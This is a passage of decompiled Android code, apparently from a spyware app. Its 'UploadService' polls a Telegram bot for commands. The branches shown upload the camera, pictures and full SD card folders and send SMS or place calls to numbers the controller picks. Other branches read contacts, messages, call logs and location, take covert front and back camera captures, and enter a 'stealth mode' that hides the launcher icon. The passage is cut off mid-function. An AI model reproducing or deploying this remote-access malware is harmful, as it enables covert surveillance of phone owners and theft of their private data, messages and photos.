                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۰String$arg1$callEQEQ$cond46$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimCameraFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲Boolean$arg0$call$setdcimCameraFolderSending$$branch46$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass53(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۲String$arg1$callEQEQ$cond47$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.picturesFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹Boolean$arg0$call$setpicturesFolderSending$$branch47$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass54(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass55(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۴String$arg1$callEQEQ$cond48$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.picturesFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۰Boolean$arg0$call$setpicturesFolderSending$$branch48$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass56(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۶String$arg1$callEQEQ$cond49$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵Boolean$arg0$call$setdcimFolderSending$$branch49$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass57(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass58(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۸۸String$arg1$callEQEQ$cond50$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.dcimFolderSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶Boolean$arg0$call$setdcimFolderSending$$branch50$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass59(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۰String$arg1$callEQEQ$cond51$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.fullSdcardSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱Boolean$arg0$call$setfullSdcardSending$$branch51$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass60(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass61(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۲String$arg1$callEQEQ$cond52$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.fullSdcardSending = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲Boolean$arg0$call$setfullSdcardSending$$branch52$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass62(UploadService.this, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۴String$arg0$callstartsWith$cond53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String rest = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۶String$arg0$callremovePrefix$valrest$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        int idx = StringsKt.indexOf$default(rest, LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۹Char$arg0$callindexOf$validx$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), 0, false, 6, (Object) null);
                                        if (idx > LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۱Int$arg1$callgreater$cond$cond$if$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() && rest.length() > LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۸Int$arg0$callplus$arg1$callgreater$branch$cond$if$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + idx) {
                                            String number = rest.substring(LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۴Int$arg0$callsubstring$valnumber$branch$if$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), idx);
                                            Intrinsics.checkNotNullExpressionValue(number, "this as java.lang.String…ing(startIndex, endIndex)");
                                            String msg3 = rest.substring(LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۶Int$arg0$callplus$arg0$callsubstring$valmsg$branch$if$branch53$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService() + idx);
                                            Intrinsics.checkNotNullExpressionValue(msg3, "this as java.lang.String).substring(startIndex)");
                                            UploadService.this.sendSmsAndNotify(number, msg3);
                                        } else {
                                            BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass63(UploadService.this, null), 3, (Object) null);
                                        }
                                    } else if (StringsKt.startsWith$default(data, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۵String$arg0$callstartsWith$cond54$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String number2 = StringsKt.removePrefix(data, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۲String$arg0$callremovePrefix$valnumber$branch54$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        if (!StringsKt.isBlank(number2)) {
                                            UploadService.this.makeCallAndNotify(number2);
                                        } else {
                                            BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass64(UploadService.this, null), 3, (Object) null);
                                        }
                                    }
                                } else {
                                    i = i2;
                                    JSONObject message = update.optJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۱String$arg0$calloptJSONObject$valmessage$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    String strOptString = message != null ? message.optString(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۸String$arg0$calloptString$else$when$valtmp9_elvis_lhs$valtext$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService()) : null;
                                    if (strOptString == null) {
                                        strOptString = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۷۳String$branch$when$valtext$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                    }
                                    String text = strOptString;
                                    if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۸۵String$arg0$callstartsWith$cond$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String msg4 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۸String$arg0$callremovePrefix$valmsg$branch$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.sendSpeakTextToMainActivity(msg4);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass65(UploadService.this, msg4, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۰۷String$arg1$callEQEQ$cond1$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendLiveReadingStatus(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۶Boolean$arg0$callsendLiveReadingStatus$branch1$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۹String$arg1$callEQEQ$cond2$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.sendLiveReadingStatus(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۸Boolean$arg0$callsendLiveReadingStatus$branch2$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۵۱String$arg1$callEQEQ$cond3$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass66(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۶۷String$arg1$callEQEQ$cond4$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stealthMode = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۵Boolean$arg0$call$setstealthMode$$branch4$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass67(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.setLauncherIconVisible(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۵Boolean$arg0$callsetLauncherIconVisible$branch4$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۲String$arg0$callstartsWith$cond5$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String msg5 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۰String$arg0$callremovePrefix$valmsg$branch5$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.sendToastToMainActivity(msg5);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass68(UploadService.this, msg5, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۹۸String$arg0$callstartsWith$cond6$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String url2 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۴۸String$arg0$callremovePrefix$valurl$branch6$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        UploadService.this.sendLinkOpenToMainActivity(url2);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass69(UploadService.this, url2, null), 3, (Object) null);
                                    } else if (StringsKt.startsWith$default(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۰String$arg0$callstartsWith$cond7$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                        String arg2 = StringsKt.removePrefix(text, LiveLiterals$UploadServiceKt.INSTANCE.m۹۳۶String$arg0$callremovePrefix$valarg$branch7$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        if (StringsKt.contains$default(arg2, LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۶Char$arg0$callcontains$cond$if$branch7$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), false, 2, (Object) null)) {
                                            UploadService.this.openAppByPackage(arg2);
                                        } else {
                                            UploadService.this.openAppByName(arg2);
                                        }
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۵String$arg1$callEQEQ$cond8$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.setFlashlight(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۰Boolean$arg0$callsetFlashlight$branch8$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass70(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۹۷String$arg1$callEQEQ$cond9$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.setFlashlight(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۲Boolean$arg0$callsetFlashlight$branch9$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService());
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass71(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۰۹String$arg1$callEQEQ$cond10$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readContacts = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۷Boolean$arg0$call$setreadContacts$$branch10$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass72(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass73(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۱String$arg1$callEQEQ$cond11$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readContacts = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹Boolean$arg0$call$setreadContacts$$branch11$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass74(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۳String$arg1$callEQEQ$cond12$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readSms = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۵Boolean$arg0$call$setreadSms$$branch12$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass75(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass76(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۵String$arg1$callEQEQ$cond13$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readSms = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۷Boolean$arg0$call$setreadSms$$branch13$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass77(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۷String$arg1$callEQEQ$cond14$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readCallLog = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۳Boolean$arg0$call$setreadCallLog$$branch14$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass78(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass79(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۱۹String$arg1$callEQEQ$cond15$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readCallLog = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵Boolean$arg0$call$setreadCallLog$$branch15$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass80(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۱String$arg1$callEQEQ$cond16$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readLocation = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱Boolean$arg0$call$setreadLocation$$branch16$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass81(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.sendCurrentLocationToTelegram();
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۳String$arg1$callEQEQ$cond17$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.readLocation = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۳Boolean$arg0$call$setreadLocation$$branch17$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass82(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۵String$arg1$callEQEQ$cond18$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.stealthMode = LiveLiterals$UploadServiceKt.INSTANCE.m۱۵۳Boolean$arg0$call$setstealthMode$$branch18$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass83(UploadService.this, null), 3, (Object) null);
                                        UploadService.this.minimizeAndHideApp();
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۲۷String$arg1$callEQEQ$cond19$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraFront = LiveLiterals$UploadServiceKt.INSTANCE.m۹۷Boolean$arg0$call$setbackgroundCameraFront$$branch19$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job7 = UploadService.this.cameraFrontJob;
                                        if (job7 != null) {
                                            Job.DefaultImpls.cancel$default(job7, (CancellationException) null, 1, (Object) null);
                                            Unit unit7 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraFrontJob = BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass84(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass85(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۱String$arg1$callEQEQ$cond20$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraFront = LiveLiterals$UploadServiceKt.INSTANCE.m۹۹Boolean$arg0$call$setbackgroundCameraFront$$branch20$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job8 = UploadService.this.cameraFrontJob;
                                        if (job8 != null) {
                                            Job.DefaultImpls.cancel$default(job8, (CancellationException) null, 1, (Object) null);
                                            Unit unit8 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraFrontJob = null;
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass86(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۳String$arg1$callEQEQ$cond21$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraBack = LiveLiterals$UploadServiceKt.INSTANCE.m۹۳Boolean$arg0$call$setbackgroundCameraBack$$branch21$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job9 = UploadService.this.cameraBackJob;
                                        if (job9 != null) {
                                            Job.DefaultImpls.cancel$default(job9, (CancellationException) null, 1, (Object) null);
                                            Unit unit9 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraBackJob = BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass87(UploadService.this, null), 3, (Object) null);
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass88(UploadService.this, null), 3, (Object) null);
                                    } else if (Intrinsics.areEqual(text, LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۳۵String$arg1$callEQEQ$cond22$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService())) {
                                        UploadService.this.backgroundCameraBack = LiveLiterals$UploadServiceKt.INSTANCE.m۹۵Boolean$arg0$call$setbackgroundCameraBack$$branch22$when$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService();
                                        Job job10 = UploadService.this.cameraBackJob;
                                        if (job10 != null) {
                                            Job.DefaultImpls.cancel$default(job10, (CancellationException) null, 1, (Object) null);
                                            Unit unit10 = Unit.INSTANCE;
                                        }
                                        UploadService.this.cameraBackJob = null;
                                        BuildersKt.launch$default($this$launch, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass89(UploadService.this, null), 3, (Object) null);
